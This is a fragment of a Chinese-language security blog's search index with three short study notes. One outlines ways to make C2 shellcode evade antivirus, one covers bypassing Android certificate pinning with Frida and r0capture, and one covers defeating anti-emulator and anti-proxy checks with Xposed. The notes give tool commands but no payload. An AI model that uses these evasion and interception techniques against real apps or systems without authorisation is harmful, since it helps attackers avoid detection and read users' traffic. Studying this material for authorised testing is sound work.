      <title>C2远控免杀</title>
      <link href="/2025/06/17/C2%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80/"/>
      <url>/2025/06/17/C2%E8%BF%9C%E6%8E%A7%E5%85%8D%E6%9D%80/</url>
      
        <content type="html"><![CDATA[<h1 id="C2远控免杀"><a href="#C2远控免杀" class="headerlink" title="C2远控免杀"></a>C2远控免杀</h1><p>免杀思路：<br>1，Shellcode自写打乱 - 针对杀毒不认识<br>2，Shellcode加密混淆 - 针对找到但是不知道<br>3，Shellcode分离隐藏 - 针对杀毒找不到<br>3，Shellcode注入回调 - 针对绕死干扰杀毒</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP双项认证</title>
      <link href="/2025/06/17/APP%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/"/>
      <url>/2025/06/17/APP%E5%8F%8C%E5%90%91%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="APP单项认证"><a href="#APP单项认证" class="headerlink" title="APP单项认证"></a>APP单项认证</h1><h2 id="常见的-Android-安全工具"><a href="#常见的-Android-安全工具" class="headerlink" title="常见的 Android 安全工具"></a>常见的 Android 安全工具</h2><ul><li>移动安全框架 (MobSF) 是一种自动化的一体化移动应用程序<br>(Android&#x2F;iOS&#x2F;Windows) 渗透测试、恶意软件分析和安全评估框架，能够执行静态和<br>动态分析。MobSF 支持移动应用程序二进制文件（APK、XAPK、IPA 和 APPX）以及压<br>缩源代码，并提供 REST API 以与您的 CI&#x2F;CD 或 DevSecOps 管道无缝集成。动态<br>分析器可帮助您执行运行时安全评估和交互式仪器测试。</li></ul><p>-Mobexler 是基于 Elementary OS 的定制虚拟机，旨在帮助进行 Android 和 iOS 应<br>用程序的渗透测试。Mobexler 预装了各种开源工具，脚本，黑客必备软件等，这些都是<br>安全测试 Android 和 iOS 应用程序所必需的。<br><a href="https://mobexler.com/">https://mobexler.com/</a></p><h2 id="APP-双向认证绕过"><a href="#APP-双向认证绕过" class="headerlink" title="APP 双向认证绕过"></a>APP 双向认证绕过</h2><p>–r0capture 仅限安卓平台，测试安卓 7、8、9、10、11 可用 ；无视所有证书校验或<br>绑定，不用考虑任何证书的事情；通杀 TCP&#x2F;IP 四层模型中的应用层中的全部协议；通杀<br>协议包括：Http,WebSocket,Ftp,Xmpp,Imap,Smtp,Protobuf 等、及它们的 SSL<br>版本；通杀所有应用层框架，包括 HttpUrlConnection、Okhttp1&#x2F;3&#x2F;4、<br>Retrofit&#x2F;Volley 等等；无视加固，不管是整体壳还是二代壳或 VMP，不考虑加固事<br>情</p><p>–Firda 是一款易用的跨平 Hook 工具， Java 层到 Native 层的 Hook 无所不能，是<br>一种 动态 的插桩工具，可以插入代码到原生 App 的内存空间中，动态的去监视和修改<br>行为，原生平台包括 Win、Mac、Linux、Android、iOS 全平台。</p><h3 id="方案-1-Firda-rOcapture-WireShark（抖音）"><a href="#方案-1-Firda-rOcapture-WireShark（抖音）" class="headerlink" title="方案 1:Firda+rOcapture+WireShark（抖音）"></a>方案 1:Firda+rOcapture+WireShark（抖音）</h3><p><a href="https://github.com/r0ysue/rOcapture">https://github.com/r0ysue/rOcapture</a><br>模拟器执行：.&#x2F;frida-server<br>获取包名：ls&#x2F;data&#x2F;data 或 Apk 资源器查看<br>python rOcapture.py -U -f 包名 -p xxxx.pcap</p><h3 id="方案-2-Firda-HOOK-JS-BurpSuite"><a href="#方案-2-Firda-HOOK-JS-BurpSuite" class="headerlink" title="方案 2:Firda+HOOK-JS+BurpSuite"></a>方案 2:Firda+HOOK-JS+BurpSuite</h3><p><a href="https://github.com/apkunpacker/FridaScripts">https://github.com/apkunpacker/FridaScripts</a><br>模拟器执行：.&#x2F;frida-server<br>本地执行：frida-U-f 包名 - 1hookjs 文件</p><h3 id="方案-3：导入证书"><a href="#方案-3：导入证书" class="headerlink" title="方案 3：导入证书"></a>方案 3：导入证书</h3><p>利用场景：能反编译，有证书文件<br>1、解压获取 apk 的证书文件<br>2、反编译后得到证书文件的密钥<br>3、Burp 导入证书后实现对应抓包</p><p><a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>1、本地安装 Frida<br>pip install frida<br>pip install frida-tools</p><p>ADB 就是连接 Android 手机与 PC 端的桥梁，所以 ADB 又称为安卓调试桥（注意：是安卓，不是 iOS），可以让用户在电脑上对手机进行全面的操作</p><p><a href="https://dl.google.com/android/repository/platform-tools-latest-windows.zip">https://dl.google.com/android/repository/platform-tools-latest-windows.zip</a></p><p>并配置环境变量</p><p>2、模拟器安装 Frida<br>注意：版本要与本地 Frida 一致<br>下载：<a href="https://github.com/frida/frida/releases">https://github.com/frida/frida/releases</a><br>真机：ARM 版本及位数 模拟器：无 ARM 的位数<br>getprop ro.product.cpu.abi &#x2F;&#x2F; 查看版本，可使用 termux</p><p>本机操作：<br>adb connect 127.0.0.1:7555<br>adb root<br>adb push frida-server &#x2F;data&#x2F;local<br>adb shell<br>cd &#x2F;data&#x2F;local&#x2F;tmp&#x2F;<br>chmod 777 frida-server<br>.&#x2F;frida-server<br>模拟器执行：.&#x2F;frida-server<br>本地执行：frida-U-f 包名 - 1hookjs 文件</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>APP单项认证</title>
      <link href="/2025/06/17/APP%E5%8D%95%E9%A1%B9%E8%AE%A4%E8%AF%81/"/>
      <url>/2025/06/17/APP%E5%8D%95%E9%A1%B9%E8%AE%A4%E8%AF%81/</url>
      
        <content type="html"><![CDATA[<h1 id="APP单项认证"><a href="#APP单项认证" class="headerlink" title="APP单项认证"></a>APP单项认证</h1><h2 id="单项认证的绕过："><a href="#单项认证的绕过：" class="headerlink" title="单项认证的绕过："></a>单项认证的绕过：</h2><p>没有限制过滤的抓包问题：<br>1、抓不到-工具证书没配置好<br>2、抓不到-app走的不是http&#x2F;s<br>有限制过滤的抓包问题：<br>3、抓不到-反模拟器调试<br>4、抓不到-反代理VPN<br>5、抓不到-反证书检验<br>做移动安全测试时，设置好了代理，但抓不到数据包<br>反抓包Demo：<a href="https://github.com/AndroidAppSec/vuls">https://github.com/AndroidAppSec/vuls</a><br>反调试Demo：<a href="https://github.com/lamster2018/EasyProtector">https://github.com/lamster2018/EasyProtector</a> </p><p>防护手段：<br>1、反模拟器：禁用模拟器进行调试访问 </p><p>2、反证书检验：SSL证书绑定（单向校验和双向校验）<br>单项校验-客户端校验服务端的证书。<br>双向认证-客户端不仅仅要校验服务端的证书，<br>也会在app内放一张证书；服务端也会检验客户端里的证书。 </p><p>3、反代理VPN：代理检测、VPN检测、发包框架强制不走代理<br>配置代理后无法访问，数据异常等<br>连接VPN节点后无法访问，数据异常等<br>配置代理后正常访问且无任何异常，但无数据包 </p><p>绕过手段：<br>-反模拟器：（某社交相亲）<br>1、用真机<br>2、模拟器模拟真机<br>3、逆向删反代码重打包 </p><p>-反证书检验：（某游戏营地）<br>1、单向-XP框架<br>2、双向<br>3、逆向删反代码重打包<br>XP框架安装：<br><a href="https://blog.csdn.net/weixin_49941977/article/details/121318015">https://blog.csdn.net/weixin_49941977/article/details/121318015</a><br>-反代理：<br>1、使用电脑端的proxfiter代理</p><p>以 MuMu Android12 为例：</p><p>1，安装 mask 面具：</p><p><a href="https://mumu.163.com/help/20240202/35044_1136675.html#a2">https://mumu.163.com/help/20240202/35044_1136675.html#a2</a></p><p>2，Lsposed</p><p><a href="https://github.com/LSPosed/LSPosed/releases/tag/v1.9.2">https://github.com/LSPosed/LSPosed/releases/tag/v1.9.2</a></p><p>并安装两个插件</p><p><a href="https://github.com/scopion/xposed-ssl-pinning">https://github.com/scopion/xposed-ssl-pinning</a></p><p><img src="https://myhaoblog.oss-cn-beijing.aliyuncs.com/blog%20%E5%9B%BE%E7%89%87/%E5%9B%BE%E7%89%87.png"></p>]]></content>
      
      
      <categories>
          
          <category> 基础知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
